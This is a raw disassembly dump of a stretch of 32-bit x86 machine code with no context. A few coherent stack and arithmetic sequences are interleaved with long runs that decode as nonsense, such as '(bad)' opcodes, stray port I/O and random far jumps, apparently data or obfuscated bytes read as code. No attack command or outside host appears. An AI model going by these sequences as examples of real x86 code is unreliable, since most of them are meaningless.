  419de4:	dec    ebp
  419de5:	push   ss
  419de6:	jne    0x419e2f
  419de8:	adc    dl,BYTE PTR [ecx+0x39682683]
  419dee:	add    eax,0xe64056f6
  419df3:	outs   dx,BYTE PTR ds:[esi]
  419df4:	call   0x3b2c:0x9164798b
  419dfb:	cmp    esp,DWORD PTR [ebx]
  419dfd:	out    0xd8,eax
  419dff:	jns    0x419e31
  419e01:	mov    ?,ecx
  419e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e04:	test   BYTE PTR [esi-0x75],ah
  419e07:	push   esp
  419e08:	and    al,0x24
  419e0a:	xor    cx,dx
  419e0d:	mov    dx,WORD PTR [esp+0x2c]
  419e12:	imul   cx,dx
  419e16:	mov    dx,WORD PTR [esp+0x38]
  419e1b:	and    cx,dx
  419e1e:	mov    edx,0x694c
  419e23:	and    cx,dx
  419e26:	mov    dx,WORD PTR [esp+0x3c]
  419e2b:	cmp    dx,cx
  419e2e:	ja     0x41a320
  419e34:	mov    ecx,DWORD PTR [esp+0x18]
  419e38:	mov    edx,DWORD PTR [esp+0x1c]
  419e3c:	jmp    0x41a099
  419e41:	add    edi,DWORD PTR [edx-0x6d83ed16]
  419e47:	cmp    al,0xbc
  419e49:	loopne 0x419e57
  419e4b:	inc    edx
  419e4c:	fstp   QWORD PTR [ebp-0x24]
  419e4f:	repnz iret 
  419e51:	adc    edx,DWORD PTR [edi]
  419e53:	sar    BYTE PTR [esi-0x41413dcb],0x96
  419e5a:	add    bl,BYTE PTR [ecx+0x264e82c3]
  419e60:	push   0x31
  419e62:	adc    al,0x12
  419e64:	std    
  419e65:	lock dec eax
  419e67:	inc    ah
  419e69:	pop    ds
  419e6a:	scas   al,BYTE PTR es:[edi]
  419e6b:	(bad)  [ebx]
  419e6d:	addr16 mov ebx,0x36d83f89
  419e73:	add    ch,ch
  419e75:	cmp    ch,BYTE PTR [ecx+0x3a6e3423]
  419e7b:	enter  0x604d,0x7
  419e7f:	pop    es
  419e80:	xor    eax,DWORD PTR [ecx+eiz*1+0x9ce3880]
  419e87:	adc    esi,ebx
  419e89:	into   
  419e8a:	mov    WORD PTR [esi-0x1d],?
  419e8d:	or     edx,eax
  419e8f:	and    ah,BYTE PTR [eax]
  419e91:	xchg   edi,eax
  419e92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e93:	cmp    al,BYTE PTR [eax+eiz*2]
  419e96:	push   edi
  419e97:	mov    ds:0xf19f1f57,eax
  419e9c:	dec    esi
  419e9d:	scas   eax,DWORD PTR es:[edi]
  419e9e:	dec    esi
  419e9f:	cmp    al,0x11
  419ea1:	aas    
  419ea2:	fmul   st(2),st
  419ea4:	loop   0x419ef7
  419ea6:	daa    
  419ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ea8:	mov    ebx,0x3526ec75
  419ead:	scas   eax,DWORD PTR es:[edi]
  419eae:	push   eax
  419eaf:	mov    ecx,0x6b28ceac
  419eb4:	in     al,0x90
  419eb6:	jl     0x419eba
  419eb8:	ss push eax
  419eba:	repnz mov ?,WORD PTR [eax]
  419ebd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ebe:	mul    DWORD PTR [ebp+0x21]
  419ec1:	retf   
  419ec2:	mov    ebp,0x463ba1ce
  419ec7:	or     ecx,DWORD PTR [edi+0x23669f65]
  419ecd:	or     bl,BYTE PTR [ecx]
  419ecf:	aaa    
  419ed0:	sbb    ebp,DWORD PTR [ebp-0x6d]
  419ed3:	and    eax,DWORD PTR [esi]
  419ed5:	mov    dh,0x40
  419ed7:	out    0xa4,eax
  419ed9:	dec    eax
  419eda:	retf   
  419edb:	and    ah,bl
  419edd:	icebp  
  419ede:	dec    ebp
  419edf:	jno    0x419eef
  419ee1:	pop    ds
  419ee2:	js     0x419ef8
  419ee4:	imul   eax,DWORD PTR [ebx+0x21],0xb90ba453
  419eeb:	inc    eax
  419eec:	out    dx,eax
  419eed:	repz xchg ecx,eax
  419eef:	jnp    0x419efb
  419ef1:	push   0x1e
  419ef3:	std    
  419ef4:	jmp    0x2435:0x849756bf
  419efb:	sub    eax,0x23ad3507
  419f00:	or     DWORD PTR [ebx+0x2c51751a],0x1b9c38c6
  419f0a:	nop
  419f0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f0c:	dec    edx
  419f0d:	jb     0x419f37
  419f0f:	xchg   edx,eax
  419f10:	shl    BYTE PTR [ebx+0x68],0x7c
  419f14:	hlt    
  419f15:	inc    esp
  419f16:	cmp    bh,bl
  419f18:	mov    ch,0xdf
  419f1a:	pop    ds
  419f1b:	mov    dl,0x57
  419f1d:	mov    ebx,DWORD PTR [edi-0x56]
  419f20:	out    dx,eax
  419f21:	fwait
  419f22:	sub    eax,0x46175c62
  419f27:	pop    ecx
  419f28:	mov    bl,0x6c
  419f2a:	nop
  419f2b:	push   cs
  419f2c:	sbb    DWORD PTR [edi+edi*2+0x16b923a5],esp
  419f33:	add    BYTE PTR [esi+0x52ec8f8b],ch
  419f39:	jnp    0x419f90
  419f3b:	and    al,0x3a
  419f3d:	push   esi
  419f3e:	or     ah,BYTE PTR [edx+esi*8-0x76]
  419f42:	outs   dx,BYTE PTR ds:[esi]
  419f43:	mov    ds:0x5e9182a4,eax
  419f48:	mov    cl,0xb4
  419f4a:	and    DWORD PTR [edi-0x39defb9],eax
  419f50:	(bad)  
  419f52:	or     ch,BYTE PTR [esi+0xebbbf57]
  419f58:	gs jae 0x419f5f
  419f5b:	cdq    
  419f5c:	jle    0x419f02
  419f5e:	mov    esp,0x6dc31056
  419f63:	nop
  419f64:	add    eax,0x812b1839
  419f69:	pop    eax
  419f6a:	dec    ebp
  419f6b:	sbb    eax,0x4c3ce883
  419f70:	push   ebx
  419f71:	push   edi
  419f72:	jmp    0x419ff3
  419f74:	pop    eax
  419f75:	fcom   DWORD PTR [eax+0x11ff4748]
  419f7b:	sub    esp,esi
  419f7d:	(bad)  
  419f7e:	xlat   BYTE PTR ds:[ebx]
  419f7f:	fs pop esi
  419f81:	dec    ecx
  419f82:	icebp  
  419f83:	xor    DWORD PTR [edx+esi*4+0x7d6424e9],ebx
  419f8a:	(bad)  
  419f8b:	jbe    0x419f19
  419f8d:	es daa 
  419f8f:	cmp    eax,0x762d89a4
  419f94:	inc    ecx
  419f95:	lods   eax,DWORD PTR ds:[esi]
  419f96:	int3   
  419f97:	sub    ch,BYTE PTR [eiz*8-0x55550eae]
  419f9e:	and    ebp,0xc7891f95
  419fa4:	jo     0x419f27
  419fa6:	test   al,0x82
  419fa8:	sti    
  419fa9:	mov    DWORD PTR ds:0x4b9be210,ebp
  419faf:	int3   
  419fb0:	pop    ebx
  419fb2:	xchg   esi,eax
  419fb3:	adc    DWORD PTR [ecx-0x309b815d],esi
  419fb9:	aas    
  419fba:	inc    edi
  419fbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fbc:	aam    0x6e
  419fbe:	jbe    0x419fbb
  419fc0:	add    al,bl
  419fc2:	and    ebp,DWORD PTR [edx]
  419fc4:	adc    ah,BYTE PTR [ebp+edx*4-0x7f]
  419fc8:	inc    ecx
  419fc9:	inc    esi
  419fca:	outs   dx,BYTE PTR ds:[esi]
  419fcb:	fidivr DWORD PTR [edi]
  419fcd:	not    DWORD PTR [ecx+0x7e270f23]
  419fd3:	xchg   eax,esi
  419fd5:	jmp    0xf159f508
  419fda:	lods   al,BYTE PTR ds:[esi]
  419fdb:	es ins BYTE PTR es:[edi],dx
  419fdd:	jp     0x41a044
  419fdf:	push   0x1befa84d
  419fe4:	jl     0x419fa2
  419fe6:	(bad)  
  419fe8:	mov    eax,ds:0x68b00995
  419fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fee:	push   edx
  419fef:	pop    ds
  419ff0:	out    0x7b,eax
  419ff2:	rol    cl,0x2f
  419ff5:	jmp    0x419f90
  419ff7:	or     eax,0x40130140
  419ffc:	cmp    ebx,DWORD PTR [bx+0x55]
  41a000:	lock mov ebx,0x2b531db
  41a006:	jmp    0x1ef5:0x31842bb
  41a00d:	push   esp
  41a00e:	mov    eax,0x7cf9ae6c
  41a013:	call   0x5b52b2ff
  41a018:	cmp    eax,0x38bc866f
  41a01d:	cli    
  41a01e:	addr16 in al,0x6b
  41a021:	inc    esp
  41a022:	add    DWORD PTR [edi+eax*4+0x68],0xffffff82
  41a027:	jmp    0x419ff2
  41a029:	push   edi
  41a02a:	push   ecx
  41a02b:	xchg   edi,eax
  41a02c:	mov    edx,0x18ba0274
  41a031:	adc    al,0xf5
  41a033:	and    al,0x41
  41a035:	test   DWORD PTR [ebx],eax
  41a037:	rcl    cl,cl
  41a039:	mov    esp,0xa59bfdca
  41a03e:	arpl   WORD PTR [eax],cx
  41a040:	cmp    BYTE PTR [ecx+0x528f5c1b],0xf8
  41a047:	jmp    0x103b:0x78da5e54
  41a04e:	aaa    
  41a04f:	das    
  41a050:	into   
  41a051:	pop    ebx
  41a052:	dec    esp
  41a053:	add    BYTE PTR [ebp-0x9],cl
  41a056:	xor    al,0x57
  41a058:	outs   dx,BYTE PTR ds:[esi]
  41a059:	add    ch,cl
  41a05b:	ins    DWORD PTR es:[edi],dx
  41a05c:	and    BYTE PTR [ebx-0x34722ddf],ah
  41a062:	and    BYTE PTR [edi],dh
  41a064:	add    DWORD PTR [edi*2-0x64df3001],ecx
  41a06b:	and    DWORD PTR [esi],0xc9eb1b3e
  41a071:	push   edi
  41a072:	mov    esp,0x43dad26e
  41a077:	jbe    0x41a0ea
  41a079:	xchg   BYTE PTR [esi+0x3eb78c08],al
  41a07f:	stos   BYTE PTR es:[edi],al
  41a080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a081:	cmp    eax,0xf0a101e5
  41a086:	mov    DWORD PTR [ebp+0x5],esp
  41a089:	xor    eax,0xd06a34fd
  41a08e:	add    eax,0xad8c9c3e
  41a093:	push   ds
  41a094:	pop    ss
  41a095:	scas   eax,DWORD PTR es:[edi]
  41a096:	lahf   
  41a097:	imul   ebx,DWORD PTR [edi],0x2d1ac0f
  41a09d:	xor    ecx,eax
  41a09f:	mov    eax,DWORD PTR [esp+0x18]
  41a0a3:	shr    edx,0x2
  41a0a6:	mov    edx,DWORD PTR [esp+0x1c]
  41a0aa:	xor    edx,edx
  41a0ac:	jmp    0x41a309
  41a0b1:	scas   ax,WORD PTR es:[edi]
  41a0b3:	xchg   ebx,eax
  41a0b4:	mov    dh,0x9c
  41a0b6:	mov    edx,0x94c4af6c
  41a0bb:	pop    esp
  41a0bc:	rcl    ebx,1
  41a0be:	call   0x1bcd3f21
  41a0c3:	sar    BYTE PTR [esi-0x41413dcb],0xbf
  41a0ca:	push   eax
  41a0cb:	dec    ecx
  41a0cc:	mov    DWORD PTR [ebx+0x50],eax
  41a0cf:	xor    edx,ecx
  41a0d1:	fist   WORD PTR [ecx-0x6956d61]
  41a0d7:	aaa    
  41a0d8:	cdq    
  41a0d9:	nop
  41a0da:	push   cs
  41a0db:	outs   dx,BYTE PTR ds:[esi]
  41a0dc:	sub    eax,0xf396f893
  41a0e1:	in     al,dx
  41a0e2:	sub    cl,dh
  41a0e4:	adc    BYTE PTR [esi+0x4c78fc4b],bh
  41a0ea:	and    ebx,esi
  41a0ec:	jo     0x41a161
  41a0ee:	mov    edi,es
  41a0f0:	mov    ebx,0x9c18897b
  41a0f5:	pushf  
  41a0f6:	mov    ebx,0x3bba2322
  41a0fb:	add    edx,DWORD PTR [esi+0x7d]
  41a0fe:	out    0xfe,al
  41a100:	mov    eax,0x8ffa9fbd
  41a105:	xchg   ebx,eax
  41a106:	or     edi,DWORD PTR [ebp+0xf2ebda6]
  41a10c:	test   eax,0x760310cf
  41a111:	push   0x34
  41a113:	push   ds
  41a114:	mov    ds:0x33f9351,al
  41a119:	test   al,0xc0
  41a11b:	(bad)  
  41a11c:	bound  edx,QWORD PTR [ecx-0x56]
  41a11f:	xor    eax,DWORD PTR [edi+0x39]
  41a122:	test   ebx,ecx
  41a124:	xchg   ebp,eax
  41a125:	mov    dh,0x88
  41a127:	rep stos BYTE PTR es:[edi],al
  41a129:	xchg   ch,al
  41a12b:	jae    0x41a0fa
  41a12d:	push   ebp
  41a12e:	pop    ecx
  41a12f:	les    ecx,FWORD PTR [edx-0x3d]
  41a132:	mov    esp,0x52ac8de5
  41a137:	push   eax
  41a138:	jns    0x41a1b8
  41a13a:	dec    esp
  41a13b:	sahf   
  41a13c:	push   edx
  41a13d:	rol    BYTE PTR gs:[esi],0x71
  41a141:	xor    ecx,DWORD PTR [esi]
  41a143:	sbb    BYTE PTR [edx],al
  41a145:	pop    edx
  41a146:	xchg   ebx,eax
  41a147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a148:	add    eax,0xbf66f3f
  41a14d:	aam    0x4d
  41a14f:	das    
  41a150:	aam    0x9c
  41a152:	into   
  41a153:	popf   
  41a154:	jo     0x41a0f3
  41a156:	cld    
  41a157:	push   0x7a
  41a159:	call   0x4a3:0x9018b148
  41a160:	call   0xf9ce:0x8bda894a
  41a167:	in     eax,dx
  41a168:	jnp    0x41a1d9
  41a16a:	pop    edx
  41a16b:	aaa    
  41a16c:	dec    ebx
  41a16d:	mov    eax,0xf08c3dc6
  41a172:	in     al,dx
  41a173:	shl    BYTE PTR [edi+0xd23481d],1
  41a179:	or     BYTE PTR [ecx+0x37],bh
  41a17c:	hlt    
  41a17d:	jmp    0xc08e4891
  41a182:	push   0x4a189caf
  41a187:	stc    
  41a188:	scas   al,BYTE PTR es:[edi]
  41a189:	xor    cl,BYTE PTR [edi+ecx*8+0x29d27f5]
  41a190:	ins    BYTE PTR es:[edi],dx
  41a191:	push   eax
  41a192:	mov    cs,WORD PTR [esi-0xfa5f125]
  41a198:	inc    esi
  41a199:	mov    edx,0x362a1e96
  41a19e:	lahf   
  41a19f:	(bad)  
  41a1a0:	outs   dx,BYTE PTR ds:[esi]
  41a1a1:	gs pop ds
  41a1a3:	fdivr  QWORD PTR [ecx]
  41a1a5:	mov    edx,0x8df84e79
  41a1aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1ab:	mov    edi,0x76d2d7a9
  41a1b0:	mov    ds:0x160657a8,eax
  41a1b5:	cdq    
  41a1b6:	pop    esi
  41a1b7:	pusha  
  41a1b8:	ss neg ebx
  41a1bb:	inc    eax
  41a1bc:	xor    al,0xc0
  41a1be:	retf   
  41a1bf:	fist   DWORD PTR [ecx+0x3b]
  41a1c2:	sub    al,0x41
  41a1c4:	push   eax
  41a1c5:	fsubr  DWORD PTR [edx+esi*2-0x1c]
  41a1c9:	lock and ah,BYTE PTR [edi-0x73]
  41a1cd:	jmp    0x41a222
  41a1cf:	mov    ah,0x18
  41a1d1:	cmp    eax,0xb7e9d9a1
  41a1d6:	push   0x20778acc
  41a1db:	inc    esi
  41a1dc:	mov    dl,0xa2
  41a1de:	mov    ecx,0xf9297a79
  41a1e3:	sub    bl,BYTE PTR [edi]
  41a1e5:	repz arpl WORD PTR [esi+0x4b],ax
  41a1e9:	mul    bl
  41a1eb:	adc    ebx,DWORD PTR [edi+0x2da06af]
  41a1f1:	dec    edx
  41a1f2:	push   ecx
  41a1f3:	xlat   BYTE PTR ds:[ebx]
  41a1f4:	rcr    eax,0xa0
  41a1f7:	jmp    FWORD PTR [edi-0x7f]
  41a1fa:	mov    eax,ds:0x2fb2b278
  41a1ff:	bnd jge 0x41a233
  41a202:	cmp    dh,dh
  41a204:	popa   
  41a205:	and    BYTE PTR fs:[ebp-0x69],dh
  41a209:	mov    ds:0x7a23fb22,al
  41a20e:	sub    al,0x35
  41a210:	into   
  41a211:	jo     0x41a1e3
  41a213:	test   DWORD PTR [eax+0x5587e37c],esi
  41a219:	cdq    
  41a21a:	jmp    0x1fd9:0xb61d1282
  41a221:	iret   
  41a222:	dec    ebx
  41a223:	imul   ebp
  41a225:	bound  esp,QWORD PTR [edx]
  41a227:	dec    edi
  41a228:	ror    DWORD PTR [esi],cl
  41a22a:	push   edx
  41a22b:	cmp    bl,BYTE PTR [eax+eiz*2+0x25]
  41a22f:	push   esi
  41a230:	scas   al,BYTE PTR es:[edi]
  41a231:	test   WORD PTR [ebx],di
  41a234:	xchg   esi,eax
  41a235:	(bad)  [eax-0x59]
  41a238:	jbe    0x41a279
  41a23a:	outs   dx,BYTE PTR ds:[esi]
  41a23b:	mov    eax,0xe7322a6f
  41a240:	pop    esi
  41a241:	loope  0x41a260
  41a243:	nop/reserved BYTE PTR [eax+0x37e0d47]
  41a24a:	xor    BYTE PTR [edi-0x2],0xd0
  41a24e:	js     0x41a2ab
  41a250:	pusha  
  41a251:	loope  0x41a28e
  41a253:	jecxz  0x41a238
  41a255:	cmp    DWORD PTR [ebx+0x5a053656],edx
  41a25b:	xchg   edx,eax
  41a25c:	fsub   DWORD PTR [eax-0x4e]
  41a25f:	push   esi
  41a260:	sub    DWORD PTR [ebp-0x6b],ebp
  41a263:	inc    edi
  41a264:	sub    al,0xa2
  41a266:	inc    ecx
  41a267:	fistp  WORD PTR [ecx-0x513d455]
  41a26d:	mov    ch,0x28
  41a26f:	xor    al,0xf1
  41a271:	mov    WORD PTR [ecx],?
  41a273:	inc    eax
  41a274:	out    0xa4,eax
  41a276:	stc    
  41a277:	gs out 0x83,eax
  41a27a:	jb     0x41a2ee
  41a27c:	retf   0x881
  41a27f:	in     eax,dx
  41a280:	xor    esp,eax
  41a282:	sahf   
  41a283:	cli    
  41a284:	cmp    edx,DWORD PTR [ebp-0x534afd10]
  41a28a:	sbb    DWORD PTR [ebp+0x7e],0xc137bfef
  41a291:	mov    BYTE PTR [ebp-0x78],ch
  41a294:	add    al,0x5d
  41a296:	mov    ss,ebp
  41a298:	jo     0x41a2d3
  41a29a:	mov    eax,0x6a4614d1
  41a29f:	retf   
  41a2a0:	daa    
  41a2a1:	scas   eax,DWORD PTR es:[edi]
  41a2a2:	int3   
  41a2a3:	pop    esi
  41a2a4:	mov    ecx,0x27d4a2ab
  41a2a9:	hlt    
  41a2aa:	mov    cl,0x72
  41a2ac:	test   bl,0xcd
  41a2af:	test   al,0xa5
  41a2b1:	scas   eax,DWORD PTR es:[edi]
  41a2b2:	aam    0x10
  41a2b4:	popa   
  41a2b5:	repz adc al,0x77
  41a2b8:	fmul   QWORD PTR [edi-0x42]
  41a2bb:	pop    esi
  41a2bc:	cmp    al,0x37
  41a2be:	and    DWORD PTR [ecx+ebx*2-0x67],esp
  41a2c2:	pop    ss
  41a2c3:	jg     0x41a280
  41a2c5:	add    edx,DWORD PTR gs:[ebp-0x4f]
  41a2c9:	psadbw mm1,mm5
  41a2cc:	inc    ebx
  41a2cd:	mov    bh,0xd4
  41a2cf:	pop    esi
  41a2d0:	fstp   st(3)
  41a2d2:	in     al,dx
  41a2d3:	inc    esp
  41a2d4:	cmp    DWORD PTR [eax-0x14d3e78c],esi
  41a2da:	cmp    ebx,edx
  41a2dc:	jmp    0x41a348
  41a2de:	or     eax,0x56b442a7
  41a2e3:	cdq    
  41a2e4:	loop   0x41a26c
  41a2e6:	cdq    
  41a2e7:	mov    ebp,0xb694711e
  41a2ec:	jmp    0x41a334
  41a2ee:	pop    ecx
  41a2ef:	loopne 0x41a2c6
  41a2f1:	mov    ebx,0x694b8d88
  41a2f6:	fldcw  WORD PTR [eax]
  41a2f8:	cmc    
  41a2f9:	loope  0x41a294
  41a2fb:	or     ebp,DWORD PTR [ecx]
  41a2fd:	fsubr  DWORD PTR [eax-0x7d]
  41a300:	dec    eax
  41a301:	or     al,0xf9
  41a303:	in     eax,dx
  41a304:	cli    
  41a305:	add    bl,bh
  41a307:	jno    0x41a2b2
  41a309:	or     edx,ecx
  41a30b:	push   edx
  41a30c:	push   esi
  41a30d:	shl    eax,0x1e
  41a310:	push   edi
  41a311:	lea    eax,[esp+0x7c]
  41a315:	push   eax
  41a316:	lea    eax,[esp+0x28]
  41a31a:	push   eax
  41a31b:	call   0x411472
  41a320:	push   DWORD PTR [esp+0x74]
  41a324:	push   DWORD PTR [esp+0x74]
  41a328:	push   DWORD PTR [esp+0x24]
  41a32c:	push   DWORD PTR [esp+0x24]
  41a330:	call   0x412349
  41a335:	mov    edx,DWORD PTR [esp+0x18]
  41a339:	mov    eax,DWORD PTR [esp+0x1c]
  41a33d:	mov    ecx,DWORD PTR [esp+0x18]
  41a341:	mov    edi,DWORD PTR [esp+0x1c]
  41a345:	shrd   edx,eax,0x2
  41a349:	shr    eax,0x2
  41a34c:	shl    ecx,0x1e
  41a34f:	xor    ecx,ecx
  41a351:	mov    eax,0x32de6d5d
  41a356:	xor    edx,eax
  41a358:	or     ecx,edx
  41a35a:	mov    edx,DWORD PTR [esp+0x5c]
  41a35e:	mov    DWORD PTR [edx],ecx
  41a360:	mov    ecx,DWORD PTR [esp+0x18]
  41a364:	jmp    0x41a5c1
  41a369:	repz sub cl,0x71
  41a36d:	mov    edx,0x20807cbb
  41a372:	shl    al,cl
  41a374:	iret   
  41a375:	out    dx,al
  41a376:	pop    edx
  41a377:	or     bh,0x4
  41a37a:	pop    ds
  41a37b:	sar    BYTE PTR [esi-0x41413dcb],0x56
  41a382:	or     BYTE PTR [edi+0x58deb2c1],bh
  41a388:	repnz out dx,eax
  41a38a:	or     ebp,0xf6b5640e
  41a390:	retf   
  41a391:	sbb    al,0xb6
  41a393:	pop    esp
  41a394:	(bad)  
  41a395:	mov    cl,0xb4
  41a397:	sbb    DWORD PTR [ebx],ecx
  41a399:	add    dl,dh
  41a39b:	add    eax,0x30ec075d
  41a3a0:	jmp    0xd6a95bb0
  41a3a5:	(bad)  
  41a3a6:	jp     0x41a3e0
  41a3a8:	rcr    bl,1
  41a3aa:	mov    esi,0x30c8fbeb
  41a3af:	jnp    0x41a3a0
  41a3b1:	int3   
  41a3b2:	add    bh,BYTE PTR [edx]
  41a3b4:	sbb    BYTE PTR [ebx-0x4d],dh
  41a3b7:	jg     0x41a378
  41a3b9:	ror    BYTE PTR [ebp+0x70],1
  41a3bc:	loope  0x41a366
  41a3be:	fcomp  DWORD PTR [edi-0x76]
  41a3c1:	daa    
  41a3c2:	jp     0x41a391
  41a3c4:	loopne 0x41a440
  41a3c6:	mov    bh,0xb2
  41a3c8:	sbb    ebp,eax
  41a3ca:	sub    dh,BYTE PTR [eax+0x450144fa]
  41a3d0:	in     eax,0xd1
  41a3d2:	scas   al,BYTE PTR es:[edi]
  41a3d3:	hlt    
  41a3d4:	sub    eax,DWORD PTR [ebp-0x5eca13ec]
  41a3da:	repz inc esi
  41a3dc:	imul   ecx,DWORD PTR [edx-0x20fa0025],0x6644fe81
  41a3e6:	jecxz  0x41a3c9
  41a3e8:	inc    ecx
  41a3e9:	mov    ss,esp
  41a3eb:	outs   dx,DWORD PTR ds:[esi]
  41a3ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3ed:	dec    edx
  41a3ee:	xor    ecx,DWORD PTR [ecx+0x7d]
  41a3f1:	xor    eax,0xc2812a76
  41a3f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3f7:	test   eax,0xde9e4df9
  41a3fc:	sub    bh,BYTE PTR [ecx]
  41a3fe:	mov    cl,0xc
  41a400:	and    DWORD PTR [edi+0x74],esp
  41a403:	loopne 0x41a394
  41a405:	xlat   BYTE PTR ds:[ebx]
  41a406:	push   edx
  41a407:	push   ds
  41a408:	adc    eax,0x8d91e5e7
  41a40d:	or     BYTE PTR [edx-0x4eff3c1c],dl
  41a413:	pop    ss
  41a414:	and    al,0x63
  41a416:	ds js  0x41a45e
  41a419:	cmc    
  41a41a:	jmp    0x7c3a:0xaa5d330
  41a421:	cld    
  41a422:	xlat   BYTE PTR ds:[ebx]
  41a423:	cmp    DWORD PTR [esi],0x27
  41a426:	xor    eax,0x5eae579b
  41a42b:	stos   DWORD PTR es:[edi],eax
  41a42c:	cdq    
  41a42d:	aam    0xc5
  41a42f:	add    dh,dl
  41a431:	and    BYTE PTR [edi+esi*2-0x69],dh
  41a435:	cmp    bh,BYTE PTR [edi+edx*8]
  41a438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a439:	icebp  
  41a43a:	jae    0x41a447
  41a43c:	(bad)  
  41a43d:	out    0x1e,al
  41a43f:	add    al,0xeb
  41a441:	and    BYTE PTR [edx-0x26],bl
  41a444:	sti    
  41a445:	stc    
  41a446:	fisub  DWORD PTR [ecx-0x524fd1a3]
  41a44c:	inc    ebx
  41a44d:	and    bh,BYTE PTR [edi]
  41a44f:	jle    0x41a47a
  41a451:	es jmp 0x25a6611b
  41a457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a458:	adc    al,0x6a
  41a45b:	repz shl DWORD PTR [edi-0x7051883e],0xab
  41a463:	loopne 0x41a43e
  41a465:	push   ss
  41a466:	dec    esi
  41a467:	xlat   BYTE PTR ds:[ebx]
  41a468:	xchg   ecx,eax
  41a469:	pop    edx
  41a46a:	adc    BYTE PTR [eax-0x5e],ch
  41a46d:	and    edx,DWORD PTR [ecx-0x5e]
  41a470:	in     al,dx
  41a471:	cmp    ebp,DWORD PTR [esi]
  41a473:	cli    
  41a474:	jnp    0x41a4e3
  41a476:	cmp    al,0x76
  41a478:	jno    0x41a48c
  41a47a:	mov    edx,0xe5ddddb2
  41a47f:	mov    WORD PTR [esi-0x56],?
  41a482:	retf   
  41a483:	stc    
  41a484:	mov    ebx,DWORD PTR [ebx-0x3e135740]
  41a48a:	push   es
  41a48b:	cwde   
  41a48c:	add    dl,bl
  41a48e:	or     al,BYTE PTR [ebp+0x3a]
  41a491:	xchg   edi,eax
  41a492:	std    
  41a493:	daa    
  41a494:	dec    esi
  41a495:	mov    dl,0x4c
  41a497:	iret   
  41a498:	cli    
  41a499:	sub    eax,0xa753f4d7
  41a49e:	adc    ebp,DWORD PTR [edx+0x18e1a953]
  41a4a4:	push   ebp
  41a4a5:	mov    edx,0xe23931bd
  41a4aa:	jge    0x41a47f
  41a4ac:	jmp    0xa4f6:0x4e5fad23
  41a4b3:	xor    DWORD PTR [eax],edi
  41a4b5:	jmp    0x41a49a
  41a4b7:	aaa    
  41a4b8:	jle    0x41a4c6
  41a4ba:	sbb    al,0x82
  41a4bc:	pop    esi
  41a4bd:	jecxz  0x41a455
  41a4bf:	inc    edx
  41a4c0:	les    esp,FWORD PTR [eax-0x4565bbe]
  41a4c6:	push   ebx
  41a4c7:	push   0x1a3ea8cc
  41a4cc:	push   ds
  41a4cd:	rcr    eax,0xfb
  41a4d0:	xchg   esi,eax
  41a4d1:	pop    esi
  41a4d2:	or     bl,0xd1
  41a4d5:	mov    bl,0x56
  41a4d7:	push   es
  41a4d8:	push   eax
  41a4d9:	mov    ds:0x457c745,al
  41a4de:	jg     0x41a503
  41a4e0:	sbb    BYTE PTR [edx+0x111007b1],ah
  41a4e6:	and    BYTE PTR [ecx],ah
  41a4e8:	xor    esp,ebp
  41a4ea:	(bad)
  41a4ee:	aad    0x76
  41a4f0:	or     eax,0x9d5b541a
  41a4f5:	ss loope 0x41a4a2
  41a4f8:	aas    
  41a4f9:	pop    ebx
  41a4fa:	push   edx
  41a4fb:	mov    al,ds:0x6862def3
  41a500:	test   BYTE PTR [edi-0x7d533dd],0x6a
  41a507:	pop    ds
  41a508:	stos   BYTE PTR es:[edi],al
  41a509:	stos   BYTE PTR es:[edi],al
  41a50a:	arpl   WORD PTR [edx+esi*8-0x57],di
  41a50e:	jb     0x41a4dc
  41a510:	mov    edx,DWORD PTR [ebp-0x57fa009c]
  41a516:	inc    edi
  41a517:	dec    ecx
  41a518:	mov    WORD PTR [ebp+0x356458e9],ds
  41a51e:	push   0xa3bae00c
  41a523:	jnp    0x41a570
  41a525:	sub    BYTE PTR [esi],ah
  41a527:	mov    WORD PTR [eax-0x2c5b173a],ds
  41a52d:	xor    ch,BYTE PTR [ecx-0x7d4b372b]
  41a533:	mov    BYTE PTR [esi-0x6e1a0cbb],bh
  41a539:	lods   al,BYTE PTR ds:[esi]
  41a53a:	xchg   edx,eax
  41a53b:	xor    dh,BYTE PTR [ecx+0x3b]
  41a53e:	dec    esi
  41a53f:	fnstsw WORD PTR [esi]
  41a541:	arpl   WORD PTR [ebp-0x39],bp
  41a544:	popf   
  41a545:	je     0x41a53c
  41a547:	adc    DWORD PTR ds:0x1b8e4ec,eax
  41a54d:	add    DWORD PTR [edi-0x18],0x352fd6a4
  41a554:	jbe    0x41a5cc
  41a556:	mov    cl,0x28
  41a558:	(bad)  
  41a559:	js     0x41a517
  41a55b:	mov    DWORD PTR ds:0x3ee6bb63,ecx
  41a561:	in     eax,dx
  41a562:	scas   al,BYTE PTR es:[edi]
  41a563:	pop    ss
  41a564:	add    ecx,ecx
  41a566:	pop    ds
  41a567:	mov    edi,0xd3be7e87
  41a56c:	mov    dh,0xca
  41a56e:	mov    edi,0x2975d82c
  41a573:	jno    0x41a548
  41a575:	mov    ebp,0xf7548fa9
  41a57a:	in     eax,0x42
  41a57c:	jp     0x41a590
  41a57e:	inc    edi
  41a57f:	repz aas 
  41a581:	mov    edi,0x7a4ee077
  41a586:	int    0x56
  41a588:	ins    DWORD PTR es:[edi],dx
  41a589:	xchg   DWORD PTR [edx+0x42ba0e52],edi
  41a58f:	int    0x98
  41a591:	test   eax,0xc126d9c6
  41a596:	in     al,0x2a
  41a598:	jne    0x41a5b7
  41a59a:	xchg   edx,eax
  41a59b:	(bad)  
  41a59d:	mov    ds:0x47d51fb4,eax
  41a5a2:	scas   al,BYTE PTR es:[edi]
  41a5a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5a4:	sbb    eax,ebx
  41a5a6:	mov    ds:0x664645f0,al
